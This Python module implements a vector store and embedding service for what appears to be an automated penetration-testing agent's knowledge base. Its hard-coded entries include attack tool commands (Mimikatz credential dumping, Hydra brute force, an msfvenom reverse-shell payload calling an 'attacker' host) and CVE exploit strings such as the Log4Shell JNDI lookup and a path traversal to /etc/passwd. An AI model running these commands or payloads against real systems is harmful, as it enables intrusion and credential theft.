"""
Vector Store and Embedding Service

Provides semantic search capabilities for the RAG system.
Supports multiple collections for different knowledge types.
"""

import json
import os
import logging
import hashlib
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Any, Tuple
import numpy as np

logger = logging.getLogger(__name__)


@dataclass
class Document:
    """Document for vector storage."""
    id: str
    content: str
    metadata: dict = field(default_factory=dict)
    doc_type: str = "text"  # 'cve', 'technique', 'experience', 'tool_doc', 'exploit'
    score: float = 0.0

    def to_dict(self) -> dict:
        return {"id": self.id, "content": self.content, "metadata": self.metadata, "doc_type": self.doc_type}

    @classmethod
    def from_dict(cls, data: dict) -> 'Document':
        return cls(id=data["id"], content=data["content"], metadata=data.get("metadata", {}),
                   doc_type=data.get("doc_type", "text"))


class EmbeddingService:
    """
    Embedding service using sentence-transformers.

    Falls back to simple TF-IDF-like embeddings if sentence-transformers is not installed.
    """

    def __init__(self, model_name: str = "all-MiniLM-L6-v2"):
        self.model_name = model_name
        self._model = None
        self._dimension = 384  # Default for all-MiniLM-L6-v2
        self._use_transformers = False

    def _ensure_model(self):
        """Lazy-load the embedding model."""
        if self._model is not None:
            return

        try:
            from sentence_transformers import SentenceTransformer
            self._model = SentenceTransformer(self.model_name)
            self._dimension = self._model.get_sentence_embedding_dimension()
            self._use_transformers = True
            logger.info(f"Loaded embedding model: {self.model_name} (dim={self._dimension})")
        except ImportError:
            logger.warning("sentence-transformers not installed. Using simple hash-based embeddings.")
            self._model = None
            self._dimension = 256
            self._use_transformers = False

    @property
    def dimension(self) -> int:
        self._ensure_model()
        return self._dimension

    def embed(self, texts: List[str]) -> np.ndarray:
        """Generate embeddings for a list of texts."""
        self._ensure_model()

        if self._use_transformers and self._model is not None:
            return self._model.encode(texts, normalize_embeddings=True)

        # Fallback: simple hash-based embeddings
        return np.array([self._simple_embed(t) for t in texts])

    def embed_query(self, query: str) -> np.ndarray:
        """Generate embedding for a single query."""
        return self.embed([query])[0]

    def _simple_embed(self, text: str) -> np.ndarray:
        """Simple deterministic embedding based on character hashing."""
        vec = np.zeros(self._dimension)
        words = text.lower().split()
        for i, word in enumerate(words):
            h = int(hashlib.md5(word.encode()).hexdigest(), 16)
            idx = h % self._dimension
            vec[idx] += 1.0
        # Normalize
        norm = np.linalg.norm(vec)
        if norm > 0:
            vec = vec / norm
        return vec


class VectorStore:
    """
    Vector store using ChromaDB for persistent semantic search.

    Falls back to in-memory numpy-based search if ChromaDB is not available.
    When using in-memory mode, persists to JSON for durability.
    """

    def __init__(self, persist_dir: str = "data/vector_store"):
        self.persist_dir = persist_dir or "data/vector_store"
        self._client = None
        self._collections: Dict[str, Any] = {}
        self._use_chroma = False

        # Fallback in-memory store
        self._memory_store: Dict[str, List[Tuple[str, np.ndarray, dict]]] = {}

        if persist_dir is not None:
            os.makedirs(self.persist_dir, exist_ok=True)

    def _get_json_path(self) -> str:
        """Get path for JSON persistence file."""
        return os.path.join(self.persist_dir, "memory_store.json")

    def save_to_json(self) -> bool:
        """Save in-memory store to JSON for persistence."""
        if self._use_chroma:
            return False  # ChromaDB handles persistence

        json_path = self._get_json_path()
        try:
            data = {}
            for collection, docs in self._memory_store.items():
                data[collection] = [
                    {"content": content, "embedding": emb.tolist(), "metadata": meta}
                    for content, emb, meta in docs
                ]

            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)

            logger.debug(f"Saved {sum(len(d) for d in data.values())} documents to {json_path}")
            return True
        except Exception as e:
            logger.warning(f"Failed to save memory store to JSON: {e}")
            return False

    def load_from_json(self) -> bool:
        """Load in-memory store from JSON."""
        if self._use_chroma:
            return False  # ChromaDB handles persistence

        json_path = self._get_json_path()
        if not os.path.exists(json_path):
            return False

        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)

            self._memory_store = {}
            for collection, docs in data.items():
                self._memory_store[collection] = [
                    (doc["content"], np.array(doc["embedding"]), doc["metadata"])
                    for doc in docs
                ]

            logger.info(f"Loaded {sum(len(d) for d in self._memory_store.values())} documents from {json_path}")
            return True
        except Exception as e:
            logger.warning(f"Failed to load memory store from JSON: {e}")
            return False

    def _ensure_client(self):
        """Lazy-initialize ChromaDB client."""
        if self._client is not None:
            return

        try:
            import chromadb
            self._client = chromadb.PersistentClient(path=self.persist_dir)
            self._use_chroma = True
            logger.info(f"Initialized ChromaDB at {self.persist_dir}")
        except ImportError:
            logger.warning("chromadb not installed. Using in-memory vector store.")
            self._use_chroma = False
            self.load_from_json()  # Load previously persisted data

    def add_documents(self, documents: List[Document], embeddings: np.ndarray = None,
                      collection: str = "default") -> int:
        """
        Add documents to a collection.

        Args:
            documents: List of documents to add
            embeddings: Pre-computed embeddings (optional)
            collection: Collection name

        Returns:
            Number of documents added
        """
        self._ensure_client()

        if self._use_chroma:
            return self._add_chroma(documents, embeddings, collection)
        else:
            return self._add_memory(documents, embeddings, collection)

    def search(self, query_embedding: np.ndarray, k: int = 5,
               collection: str = None, doc_type: str = None) -> List[Document]:
        """
        Search for similar documents.

        Args:
            query_embedding: Query embedding vector
            k: Number of results
            collection: Optional collection filter
            doc_type: Optional document type filter

        Returns:
            List of matching documents with scores
        """
        self._ensure_client()

        if self._use_chroma:
            return self._search_chroma(query_embedding, k, collection, doc_type)
        else:
            return self._search_memory(query_embedding, k, collection, doc_type)

    def get_collection_stats(self) -> Dict[str, int]:
        """Get document counts per collection."""
        self._ensure_client()

        stats = {}
        if self._use_chroma:
            for name in self._client.list_collections():
                col = self._client.get_collection(name)
                stats[name] = col.count()
        else:
            for name, docs in self._memory_store.items():
                stats[name] = len(docs)
        return stats

    def delete_collection(self, collection: str) -> None:
        """Delete a collection."""
        if self._use_chroma and self._client:
            try:
                self._client.delete_collection(collection)
            except Exception as e:
                logger.debug(f"Failed to delete collection {collection}: {e}")
        self._memory_store.pop(collection, None)

    # --- ChromaDB implementation ---

    def _add_chroma(self, documents: List[Document], embeddings: np.ndarray,
                    collection: str) -> int:
        col = self._client.get_or_create_collection(
            name=collection,
            metadata={"hnsw:space": "cosine"}
        )

        ids = [d.id for d in documents]
        contents = [d.content for d in documents]
        metas = [{"doc_type": d.doc_type, **d.metadata} for d in documents]

        if embeddings is not None:
            col.add(ids=ids, documents=contents, embeddings=embeddings.tolist(), metadatas=metas)
        else:
            col.add(ids=ids, documents=contents, metadatas=metas)

        return len(documents)

    def _search_chroma(self, query_embedding: np.ndarray, k: int,
                       collection: str, doc_type: str) -> List[Document]:
        results = []
        collections_to_search = [collection] if collection else [c for c in self._client.list_collections()]

        for col_name in collections_to_search:
            try:
                col = self._client.get_collection(col_name)
                where_filter = {"doc_type": doc_type} if doc_type else None
                query_result = col.query(
                    query_embeddings=query_embedding.tolist(),
                    n_results=k,
                    where=where_filter,
                    include=["documents", "metadatas", "distances"]
                )

                for i, doc_id in enumerate(query_result["ids"][0]):
                    results.append(Document(
                        id=doc_id,
                        content=query_result["documents"][0][i],
                        metadata=query_result["metadatas"][0][i] if query_result["metadatas"] else {},
                        doc_type=query_result["metadatas"][0][i].get("doc_type", "text") if query_result["metadatas"] else "text",
                        score=1.0 - query_result["distances"][0][i],
                    ))
            except Exception as e:
                logger.warning(f"Failed to search collection {col_name}: {e}")

        results.sort(key=lambda d: d.score, reverse=True)
        return results[:k]

    # --- In-memory fallback ---

    def _add_memory(self, documents: List[Document], embeddings: np.ndarray,
                    collection: str) -> int:
        if collection not in self._memory_store:
            self._memory_store[collection] = []

        for i, doc in enumerate(documents):
            emb = embeddings[i] if embeddings is not None and i < len(embeddings) else np.zeros(256)
            self._memory_store[collection].append((doc.content, emb, {"id": doc.id, **doc.metadata, "doc_type": doc.doc_type}))

        self.save_to_json()  # Persist after adding
        return len(documents)

    def _search_memory(self, query_embedding: np.ndarray, k: int,
                       collection: str, doc_type: str) -> List[Document]:
        results = []
        collections_to_search = [collection] if collection else list(self._memory_store.keys())

        for col_name in collections_to_search:
            for content, emb, meta in self._memory_store.get(col_name, []):
                if doc_type and meta.get("doc_type") != doc_type:
                    continue
                score = float(np.dot(query_embedding, emb) / (np.linalg.norm(query_embedding) * np.linalg.norm(emb) + 1e-8))
                results.append(Document(
                    id=meta.get("id", ""),
                    content=content,
                    metadata={k: v for k, v in meta.items() if k != "id"},
                    doc_type=meta.get("doc_type", "text"),
                    score=score,
                ))

        results.sort(key=lambda d: d.score, reverse=True)
        return results[:k]


class KnowledgeIndexer:
    """Index all knowledge sources into vector store."""

    TOOL_DOCUMENTATION = {
        "nmap": {
            "name": "Nmap",
            "description": "网络扫描和端口发现工具",
            "usage": "nmap -sS -sV -O target",
            "scenarios": ["端口扫描", "服务识别", "操作系统检测", "网络发现"],
            "category": "recon",
        },
        "metasploit": {
            "name": "Metasploit Framework",
            "description": "漏洞利用框架，支持多种exploit模块和payload",
            "usage": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; run",
            "scenarios": ["漏洞利用", "payload生成", "后渗透", "权限提升"],
            "category": "exploit",
        },
        "hydra": {
            "name": "Hydra",
            "description": "在线密码暴力破解工具，支持多种协议",
            "usage": "hydra -l admin -P wordlist.txt target ssh",
            "scenarios": ["密码暴力破解", "SSH破解", "HTTP表单破解", "FTP破解"],
            "category": "credential",
        },
        "mimikatz": {
            "name": "Mimikatz",
            "description": "Windows凭据提取工具，可提取内存中的密码和哈希",
            "usage": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'",
            "scenarios": ["凭据提取", "密码哈希导出", "Kerberos票据操作", "Pass-the-Hash"],
            "category": "post_exploit",
        },
        "bloodhound": {
            "name": "BloodHound",
            "description": "Active Directory攻击路径分析工具",
            "usage": "SharpHound.exe -c all",
            "scenarios": ["AD路径分析", "权限图绘制", "横向移动路径发现"],
            "category": "lateral",
        },
        "crackmapexec": {
            "name": "CrackMapExec",
            "description": "内网渗透 Swiss Army Knife，支持SMB/WinRM/SSH/MSSQL",
            "usage": "crackmapexec smb target -u user -p pass",
            "scenarios": ["内网横向移动", "凭据验证", "命令执行"],
            "category": "lateral",
        },
        "hashcat": {
            "name": "Hashcat",
            "description": "GPU加速密码哈希破解工具",
            "usage": "hashcat -m 0 -a 0 hash.txt wordlist.txt",
            "scenarios": ["哈希破解", "字典攻击", "规则攻击"],
            "category": "credential",
        },
        "john": {
            "name": "John the Ripper",
            "description": "密码破解工具，支持多种哈希格式",
            "usage": "john --wordlist=wordlist.txt hashfile",
            "scenarios": ["密码破解", "哈希识别", "规则变换"],
            "category": "credential",
        },
        "searchsploit": {
            "name": "SearchSploit",
            "description": "Exploit-DB离线搜索工具",
            "usage": "searchsploit apache 2.4",
            "scenarios": ["漏洞搜索", "exploit查找", "CVE关联"],
            "category": "exploit",
        },
        "masscan": {
            "name": "Masscan",
            "description": "高速网络扫描器",
            "usage": "masscan -p1-65535 --rate=1000 target",
            "scenarios": ["大规模端口扫描", "网络发现"],
            "category": "recon",
        },
        "winpeas": {
            "name": "WinPEAS",
            "description": "Windows权限提升枚举脚本",
            "usage": "winpeas.exe",
            "scenarios": ["Windows提权枚举", "配置检查", "敏感文件搜索"],
            "category": "post_exploit",
        },
        "linpeas": {
            "name": "LinPEAS",
            "description": "Linux权限提升枚举脚本",
            "usage": "linpeas.sh",
            "scenarios": ["Linux提权枚举", "SUID检查", "敏感文件搜索"],
            "category": "post_exploit",
        },
        "msfvenom": {
            "name": "MSFVenom",
            "description": "Metasploit payload生成器",
            "usage": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe",
            "scenarios": ["payload生成", "编码绕过", "格式转换"],
            "category": "exploit",
        },
    }

    def __init__(self, vector_store: VectorStore, embedding_service: EmbeddingService):
        self.store = vector_store
        self.embeddings = embedding_service

    def index_all(self) -> Dict[str, int]:
        """Index all knowledge sources."""
        counts = {}
        counts["cve"] = self.index_cve_database()
        counts["techniques"] = self.index_attack_techniques()
        counts["tools"] = self.index_tool_documentation()
        logger.info(f"Indexing complete: {counts}")
        return counts

    def index_cve_database(self, cve_db=None) -> int:
        """Index CVE entries into vector store."""
        documents = []

        if cve_db:
            for cve_id, entry in (cve_db.cache if hasattr(cve_db, 'cache') else {}).items():
                desc = entry.description if hasattr(entry, 'description') else str(entry)
                documents.append(Document(
                    id=f"cve_{cve_id}",
                    content=f"CVE: {cve_id}\n{desc}",
                    metadata={"cve_id": cve_id, "type": "cve"},
                    doc_type="cve",
                ))

        # Add well-known CVEs as default knowledge
        default_cves = [
            ("CVE-2021-44228", "Log4Shell: Apache Log4j2 JNDI远程代码执行漏洞。通过JNDI注入实现RCE，影响范围极广。CVSS 10.0。利用方式：发送恶意JNDI查找字符串 ${jndi:ldap://attacker/exploit}。"),
            ("CVE-2021-41773", "Apache HTTP Server路径穿越漏洞。可导致目录遍历和远程代码执行。利用方式：GET /cgi-bin/.%2e/%2e%2e/etc/passwd"),
            ("CVE-2020-1472", "Zerologon: Netlogon特权提升漏洞。攻击者可将域控制器密码设为空，获取域管理员权限。CVSS 10.0。"),
            ("CVE-2017-0144", "EternalBlue: Windows SMB远程代码执行漏洞。通过SMB协议发送特制数据包实现RCE。利用工具：MS17-010 EternalBlue。"),
            ("CVE-2019-0708", "BlueKeep: Windows RDP远程代码执行漏洞。通过RDP协议无需身份验证即可RCE。影响Windows XP/7/2003/2008。"),
            ("CVE-2020-0796", "SMBGhost: Windows SMBv3压缩远程代码执行漏洞。通过SMBv3压缩功能触发。CVSS 10.0。"),
            ("CVE-2014-0160", "Heartbleed: OpenSSL心跳包漏洞。可读取服务器内存中的敏感数据，包括私钥和密码。"),
            ("CVE-2017-5638", "Apache Struts2远程代码执行漏洞。通过Content-Type头注入OGNL表达式。"),
            ("CVE-2018-7600", "Drupalgeddon 2: Drupal远程代码执行漏洞。影响Drupal 7/8多个版本。"),
            ("CVE-2021-21972", "vSphere Client RCE: VMware vCenter Server远程代码执行漏洞。通过UploadOAFile接口上传恶意文件。"),
            ("CVE-2022-26134", "Confluence OGNL注入漏洞。通过HTTP请求注入OGNL表达式实现RCE。"),
        ]

        for cve_id, desc in default_cves:
            documents.append(Document(
                id=f"cve_{cve_id}",
                content=f"CVE: {cve_id}\n{desc}",
                metadata={"cve_id": cve_id, "type": "cve"},
                doc_type="cve",
            ))

        if documents:
            embs = self.embeddings.embed([d.content for d in documents])
            self.store.add_documents(documents, embs, collection="cve")
        return len(documents)

    def index_attack_techniques(self, attack_db=None) -> int:
        """Index MITRE ATT&CK techniques."""
        documents = []

        # Default techniques
        default_techniques = [
            ("T1046", "Network Service Discovery", "通过网络扫描发现运行的服务和开放端口。工具：nmap, masscan, netcat。适用于初始侦察和后续利用阶段的网络发现。"),
            ("T1190", "Exploit Public-Facing Application", "利用面向公网的应用程序漏洞获取初始访问权限。常见目标：Web应用、VPN、邮件服务器。"),
            ("T1110", "Brute Force", "暴力破解登录凭据。包括在线暴力破解和离线密码破解。工具：hydra, medusa, hashcat, john。"),
            ("T1021", "Remote Services", "利用远程服务进行横向移动。包括SSH、RDP、SMB、WinRM等协议。"),
            ("T1068", "Privilege Escalation", "利用漏洞或配置错误提升权限。Windows: 提升到SYSTEM/管理员。Linux: 提升到root。"),
            ("T1003", "OS Credential Dumping", "从操作系统和软件中提取凭据。工具：mimikatz, procdump, hashdump。提取LSASS内存、SAM数据库、Kerberos票据。"),
            ("T1059", "Command and Scripting Interpreter", "使用命令行和脚本解释器执行命令。包括PowerShell、Bash、Python、WMI。"),
            ("T1053", "Scheduled Task/Job", "使用计划任务实现持久化和权限提升。Windows: schtasks。Linux: cron, systemd timers。"),
            ("T1071", "Application Layer Protocol", "使用应用层协议通信以融入正常流量。HTTP/HTTPS, DNS, SMTP。"),
            ("T1087", "Account Discovery", "发现系统上的账户和组信息。Windows: net user/group。Linux: /etc/passwd, id, whoami。"),
            ("T1082", "System Information Discovery", "收集系统信息用于后续操作。包括OS版本、补丁级别、架构、网络配置。"),
            ("T1043", "Commonly Used Port", "利用常用端口进行通信。常见端口：80(HTTP), 443(HTTPS), 53(DNS), 25(SMTP)。"),
            ("T1078", "Valid Accounts", "使用合法账户凭据登录系统。获取方式：暴力破解、凭据转储、社交工程、密码喷洒。"),
            ("T1098", "Account Manipulation", "修改账户设置以维持访问。包括修改权限、添加SSH密钥、修改密码策略。"),
            ("T1070", "Indicator Removal", "清除入侵指标以避免检测。删除日志、清除事件记录、修改时间戳。"),
        ]

        for tid, name, desc in default_techniques:
            documents.append(Document(
                id=f"technique_{tid}",
                content=f"ATT&CK {tid}: {name}\n{desc}",
                metadata={"technique_id": tid, "name": name, "type": "technique"},
                doc_type="technique",
            ))

        if attack_db and hasattr(attack_db, 'techniques'):
            for tid, tech in attack_db.techniques.items():
                documents.append(Document(
                    id=f"technique_{tid}",
                    content=f"ATT&CK {tid}: {tech.name}\n{tech.description}",
                    metadata={"technique_id": tid, "name": tech.name, "type": "technique"},
                    doc_type="technique",
                ))

        if documents:
            embs = self.embeddings.embed([d.content for d in documents])
            self.store.add_documents(documents, embs, collection="techniques")
        return len(documents)

    def index_tool_documentation(self) -> int:
        """Index tool usage documentation."""
        documents = []

        for tool_id, tool_info in self.TOOL_DOCUMENTATION.items():
            content = (
                f"工具: {tool_info['name']} ({tool_id})\n"
                f"描述: {tool_info['description']}\n"
                f"用法: {tool_info['usage']}\n"
                f"适用场景: {', '.join(tool_info['scenarios'])}\n"
                f"分类: {tool_info['category']}"
            )
            documents.append(Document(
                id=f"tool_{tool_id}",
                content=content,
                metadata={"tool": tool_id, "name": tool_info["name"], "category": tool_info["category"]},
                doc_type="tool_doc",
            ))

        if documents:
            embs = self.embeddings.embed([d.content for d in documents])
            self.store.add_documents(documents, embs, collection="tools")
        return len(documents)

    def index_experiences(self, experience_store) -> int:
        """Index experiences from experience store."""
        if not experience_store or not experience_store.buffer:
            return 0

        documents = []
        for exp in experience_store.buffer:
            action_type = str(exp.action_index)
            result_str = "成功" if exp.success else "失败"
            content = (
                f"渗透经验: 动作类型={action_type}, 奖励={exp.reward:.2f}, 结果={result_str}\n"
                f"会话: {exp.session_id}\n"
                f"反思权重: {exp.reflection_weight:.2f}"
            )
            documents.append(Document(
                id=f"exp_{exp.session_id}_{exp.timestamp}",
                content=content,
                metadata={
                    "action": action_type,
                    "reward": exp.reward,
                    "success": exp.success,
                    "session_id": exp.session_id,
                },
                doc_type="experience",
            ))

        if documents:
            embs = self.embeddings.embed([d.content for d in documents[:500]])  # Limit
            self.store.add_documents(documents[:500], embs, collection="experiences")
        return len(documents)


# Global instances
_vector_store_instance: Optional[VectorStore] = None
_embedding_service_instance: Optional[EmbeddingService] = None


def get_vector_store(persist_dir: str = "data/vector_store") -> VectorStore:
    """Get or create global vector store instance."""
    global _vector_store_instance
    if _vector_store_instance is None:
        _vector_store_instance = VectorStore(persist_dir=persist_dir)
    return _vector_store_instance


def get_embedding_service(model_name: str = "all-MiniLM-L6-v2") -> EmbeddingService:
    """Get or create global embedding service instance."""
    global _embedding_service_instance
    if _embedding_service_instance is None:
        _embedding_service_instance = EmbeddingService(model_name=model_name)
    return _embedding_service_instance
